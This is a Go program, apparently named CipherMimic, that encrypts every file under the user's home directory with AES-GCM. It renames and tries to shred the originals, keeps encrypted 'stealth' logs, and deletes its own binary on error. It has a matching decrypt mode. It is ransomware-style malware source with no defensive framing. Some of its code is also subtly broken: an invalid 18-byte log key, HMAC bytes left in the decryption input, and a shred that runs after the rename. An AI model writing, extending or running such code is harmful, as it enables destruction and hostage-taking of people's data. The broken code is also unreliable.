package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"golang.org/x/crypto/argon2"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/kms"
)

const (
	saltSize  = 16
	keyLength = 32
)

var loggingEnabled = true

func main() {
	password := "super_secret_key"
	start := time.Now()

	useKMS := true // This can be configured based on environment

	var key []byte
	if useKMS {
		key = fetchKeyFromKMS("alias/CipherMimicKey")
	} else {
		salt := generateSalt()
		key = deriveKey(password, salt)
	}

	machineID := getMachineID()

	finalKey := deriveKey(string(key), []byte(machineID))

	homeDir, err := os.UserHomeDir()
	if err != nil {
		logStealth("Error getting home directory:", err)
		selfDestruct()
	}

	if len(os.Args) > 1 && os.Args[1] == "decrypt" {
		decryptDirectory(homeDir, finalKey)
	} else {
		encryptDirectory(homeDir, finalKey)
	}

	zeroMemory(key)
	zeroMemory(finalKey)

	fmt.Printf("Process completed in %s\n", time.Since(start))
}

func deriveKey(password string, salt []byte) []byte {
	return argon2.Key([]byte(password), salt, 1, 64*1024, 4, keyLength)
}

func fetchKeyFromKMS(alias string) []byte {
	sess := session.Must(session.NewSession())
	kmsSvc := kms.New(sess)

	result, err := kmsSvc.GenerateDataKey(&kms.GenerateDataKeyInput{
		KeyId:   &alias,
		KeySpec: aws.String("AES_256"),
	})
	if err != nil {
		logStealth("Error fetching key from KMS:", err)
		selfDestruct()
	}

	return result.Plaintext
}

func generateSalt() []byte {
	salt := make([]byte, saltSize)
	if _, err := io.ReadFull(rand.Reader, salt); err != nil {
		logStealth("Error generating salt:", err)
		selfDestruct()
	}
	return salt
}

func zeroMemory(data []byte) {
	for i := range data {
		data[i] = 0
	}
}

// Get machine-specific identifier (CPU serial or BIOS UUID)
func getMachineID() string {
	// This is a simplified version. In use, you'd get hardware identifiers like CPU serial, BIOS UUID, etc.
	return "unique-machine-id"
}

// Encrypt entire directory by walking through it
func encryptDirectory(directory string, key []byte) {
	var wg sync.WaitGroup
	numWorkers := runtime.NumCPU()
	fileChan := make(chan string, numWorkers)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go workerEncrypt(fileChan, key, &wg)
	}

	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		fileChan <- path
		return nil
	})
	if err != nil {
		logStealth("Error walking through directory:", err)
	}
	close(fileChan)
	wg.Wait()
}

func decryptDirectory(directory string, key []byte) {
	var wg sync.WaitGroup
	numWorkers := runtime.NumCPU()
	fileChan := make(chan string, numWorkers)

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go workerDecrypt(fileChan, key, &wg)
	}

	// Walk directory and send files to workers
	err := filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if filepath.Ext(path) == ".enc" {
			fileChan <- path
		}
		return nil
	})
	if err != nil {
		logStealth("Error walking through directory:", err)
	}
	close(fileChan)
	wg.Wait()
}

func workerEncrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
	defer wg.Done()
	for file := range fileChan {
		encryptFile(file, key)
	}
}

func workerDecrypt(fileChan chan string, key []byte, wg *sync.WaitGroup) {
	defer wg.Done()
	for file := range fileChan {
		decryptFile(file, key)
	}
}

func encryptFile(filePath string, key []byte) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		logStealth("Error reading file:", err)
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		logStealth("Error creating cipher:", err)
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		logStealth("Error creating GCM:", err)
		return
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		logStealth("Error generating nonce:", err)
		return
	}

	encryptedData := gcm.Seal(nonce, nonce, data, nil)

	// HMAC for integrity verification
	h := hmac.New(sha256.New, key)
	h.Write(encryptedData)
	hmacValue := h.Sum(nil)

	err = os.WriteFile(filePath+".enc", append(encryptedData, hmacValue...), 0666)
	if err != nil {
		logStealth("Error writing encrypted file:", err)
		return
	}

	secureObfuscateFileName(filePath)
	shredFile(filePath)
}

// Decrypt a file
func decryptFile(filePath string, key []byte) {
	encryptedData, err := os.ReadFile(filePath)
	if err != nil {
		logStealth("Error reading file:", err)
		return
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		logStealth("Error creating cipher:", err)
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		logStealth("Error creating GCM:", err)
		return
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]

	decryptedData, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		logStealth("Error decrypting file:", err)
		return
	}

	// Write the decrypted data back to a file (without ".enc" extension)
	decryptedFilePath := filePath[:len(filePath)-4] // Remove ".enc" extension
	err = os.WriteFile(decryptedFilePath, decryptedData, 0666)
	if err != nil {
		logStealth("Error writing decrypted file:", err)
		return
	}
}

// Obfuscate file name to hide original details
func secureObfuscateFileName(originalName string) {
	obfuscatedName := base64.RawURLEncoding.EncodeToString([]byte(originalName))
	randSuffix := make([]byte, 4)
	io.ReadFull(rand.Reader, randSuffix)
	newName := obfuscatedName + "-" + base64.RawURLEncoding.EncodeToString(randSuffix)
	os.Rename(originalName, newName)
}

// Shred file securely by overwriting data multiple times before deletion
func shredFile(filePath string) {
	file, err := os.OpenFile(filePath, os.O_WRONLY, 0666)
	if err != nil {
		logStealth("Error shredding file:", err)
		return
	}
	defer file.Close()

	// Overwrite file with random data 3 times for secure deletion
	for i := 0; i < 3; i++ {
		randomData := make([]byte, 1024)
		io.ReadFull(rand.Reader, randomData)
		file.Write(randomData)
	}

	os.Remove(filePath)
}

func logStealth(msg string, err error) {
	if !loggingEnabled {
		return
	}
	logData := fmt.Sprintf("%s %v\n", msg, err)
	encryptedLog := encryptLog(logData)
	appendToLogFile(encryptedLog)
}

func encryptLog(logData string) string {
	key := []byte("log-encryption-key") // Replace with secure log encryption key
	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	return string(gcm.Seal(nonce, nonce, []byte(logData), nil))
}

func appendToLogFile(data string) {
	file, err := os.OpenFile("ciphermimic.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error writing log file:", err)
	}
	defer file.Close()
	file.WriteString(data + "\n")
}

func selfDestruct() {
	fmt.Println("Unauthorized access detected. Self-destruct initiated.")
	// Delete binary
	exePath, _ := os.Executable()
	os.Remove(exePath)
	// Optionally delete logs and configurations
	os.Exit(1)
}
